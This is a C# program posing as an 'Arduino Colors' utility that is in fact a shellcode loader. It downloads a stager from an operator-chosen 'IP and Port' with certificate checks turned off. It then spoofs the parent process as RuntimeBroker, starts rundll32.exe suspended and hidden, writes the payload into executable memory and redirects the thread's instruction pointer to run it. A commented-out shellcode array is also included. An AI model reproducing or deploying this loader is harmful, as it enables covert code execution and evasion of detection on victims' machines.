using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net;
using System;

namespace Arduino
{
    public class Program
    {
        private static string url = "http://<IP and Port of your choosing>/stager.bin";
        #region Constants
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint CREATE_SUSPENDED = 0x00000004;
        const uint CREATE_NO_WINDOW = 0x08000000;
        const uint CONTEXT_CONTROL = 0x00010001;
        const uint CONTEXT_INTEGER = 0x00010002;
        const uint CONTEXT_SEGMENTS = 0x00010004;
        const uint CONTEXT_FULL = 0x00010007;
        const uint CONTEXT_ALL = 0x0001003F;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PROCESS_CREATE_PROCESS = 0x0080;
        static IntPtr PROC_THREAD_ATTRIBUTE_PARENT_PROCESS =>
        (IntPtr)(((int)ProcThreadAttributeParentProcess & 0x0000FFFF) | 0x00020000);

        const int ProcThreadAttributeParentProcess = 0;
        #endregion

        #region Structs
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string? lpReserved, lpDesktop, lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars;
            public uint dwFillAttribute, dwFlags;
            public ushort wShowWindow, cbReserved2;
            public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15;
            public ulong Rip;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] FltSave;
            public ulong VectorRegister0, VectorRegister1;
            public ulong DebugControl, LastBranchToRip, LastBranchFromRip;
            public ulong LastExceptionToRip, LastExceptionFromRip;
        }
        #endregion

        #region P/Invoke
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcessA(
            string? lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string? lpCurrentDirectory,
            ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref UIntPtr lpSize);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute,
            IntPtr lpValue, UIntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll")]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out UIntPtr lpNumberOfBytesWritten);
        #endregion
        static bool Run(string targetExe, byte[] shellcode)
        {
            // Open handle to spoofed parent process
            //uint spoofedParentPid = (uint)Process.GetCurrentProcess().Id;
            var processes = Process.GetProcessesByName("RuntimeBroker");

            if (processes.Length == 0)
            {
                Console.WriteLine("Notepad is not running.");
               
            }

            uint spoofedParentPid = (uint)processes[0].Id;
          

            //uint spoofedParentPid = (uint)Process.GetProcessesByName("notepad")[0].Id;
            IntPtr hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, false, spoofedParentPid);
            if (hParentProcess == IntPtr.Zero)
            {
                Console.WriteLine($"\n\t[!] OpenProcess Failed With Error : {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"\n\t[+] Opened handle to parent process PID: {spoofedParentPid}");

            // Get size needed for attribute list
            UIntPtr lpSize = UIntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
            IntPtr lpAttributeList = Marshal.AllocHGlobal((int)lpSize);
            if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, ref lpSize))
            {
                Console.WriteLine($"\n\t[!] InitializeProcThreadAttributeList Failed With Error : {Marshal.GetLastWin32Error()}");
                return false;
            }

            // Write parent handle to unmanaged memory
            IntPtr pParentHandle = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(pParentHandle, hParentProcess);
            Console.WriteLine($"\n\t[+] lpSize: {lpSize}");
            Console.WriteLine($"\n\t[+] lpAttributeList: 0x{lpAttributeList:X}");
            Console.WriteLine($"\n\t[+] hParentProcess: 0x{hParentProcess:X}");
            Console.WriteLine($"\n\t[+] pParentHandle: 0x{pParentHandle:X}");
            Console.WriteLine($"\n\t[+] PROC_THREAD value: 0x{PROC_THREAD_ATTRIBUTE_PARENT_PROCESS:X}");
            Console.WriteLine($"\n\t[+] IntPtr.Size: {IntPtr.Size}");
            if (!UpdateProcThreadAttribute(
                    lpAttributeList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    pParentHandle, (UIntPtr)IntPtr.Size,
                    IntPtr.Zero, IntPtr.Zero))
            {
                Console.WriteLine($"\n\t[!] UpdateProcThreadAttribute Failed With Error : {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"\n\t[+] ProcThreadAttribute updated");

            // Build STARTUPINFOEX
            STARTUPINFOEX siEx = new()
            {
                StartupInfo = new STARTUPINFO
                {
                    cb = (uint)Marshal.SizeOf<STARTUPINFOEX>()
                },
                lpAttributeList = lpAttributeList
            };

            PROCESS_INFORMATION pi;

            if (!CreateProcessA(null, targetExe, IntPtr.Zero, IntPtr.Zero,
                    false, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
                    IntPtr.Zero, null, ref siEx, out pi))
            {
                Console.WriteLine($"\n\t[!] CreateProcessA Failed With Error : {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"\n\t[+] Process spawned - PID: {pi.dwProcessId} under spoofed parent PID: {spoofedParentPid}");

            // Allocate memory in remote process
            IntPtr pAddress = VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (pAddress == IntPtr.Zero)
            {
                Console.WriteLine($"\n\t[!] VirtualAllocEx Failed With Error : {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"\n\t[+] Allocated {shellcode.Length} bytes at 0x{pAddress:X}");

            // Write shellcode into remote process
            if (!WriteProcessMemory(pi.hProcess, pAddress, shellcode, (uint)shellcode.Length, out _))
            {
                Console.WriteLine($"\n\t[!] WriteProcessMemory Failed With Error : {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"\n\t[+] Shellcode written to remote process");

            // Allocate 16 byte aligned CONTEXT
            int contextSize = Marshal.SizeOf<CONTEXT>();
            IntPtr pContext = Marshal.AllocHGlobal(contextSize + 16);
            long aligned = (pContext.ToInt64() + 15) & ~15L;
            IntPtr pAlignedContext = (IntPtr)aligned;

            // Zero out the context
            for (int i = 0; i < contextSize; i++)
                Marshal.WriteByte(pAlignedContext, i, 0);

            // Set ContextFlags
            int contextFlagsOffset = Marshal.OffsetOf<CONTEXT>("ContextFlags").ToInt32();
            Marshal.WriteInt32(pAlignedContext, contextFlagsOffset, (int)CONTEXT_CONTROL);

            if (!GetThreadContext(pi.hThread, pAlignedContext))
            {
                Console.WriteLine($"\n\t[!] GetThreadContext Failed With Error : {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"\n\t[+] Got thread context");

            // Write new RIP
            int ripOffset = Marshal.OffsetOf<CONTEXT>("Rip").ToInt32();
            Marshal.WriteInt64(pAlignedContext, ripOffset, pAddress.ToInt64());

            if (!SetThreadContext(pi.hThread, pAlignedContext))
            {
                Console.WriteLine($"\n\t[!] SetThreadContext Failed With Error : {Marshal.GetLastWin32Error()}");
                return false;
            }

            Console.WriteLine($"\n\t[+] RIP set to 0x{pAddress:X}");
            Console.WriteLine($"\n\t[+] Resuming thread...");

            ResumeThread(pi.hThread);

            // Cleanup
            DeleteProcThreadAttributeList(lpAttributeList);
            Marshal.FreeHGlobal(lpAttributeList);
            Marshal.FreeHGlobal(pParentHandle);
            Marshal.FreeHGlobal(pContext);
            CloseHandle(hParentProcess);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            return true;
        }


        public static void Adding_Colors()
        {
            string path = @"C:\Windows\System32\rundll32.exe";
            //Replace this with your actual shellcode bytes
            //byte[] sc = new byte[]
            //{
            //    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 // NOP sled placeholder
            //};
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            System.Net.WebClient client = new WebClientWithTimeout();

            byte[] sc = client.DownloadData(url);
            Run(path, sc);
        }
        static void Main()
        {
            Console.WriteLine("Arduino Colors");
            Adding_Colors();
        }
        public class WebClientWithTimeout : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                WebRequest wr = base.GetWebRequest(address);
                wr.Timeout = 50000000; // timeout in milliseconds (ms)
                return wr;
            }
        }
    }
}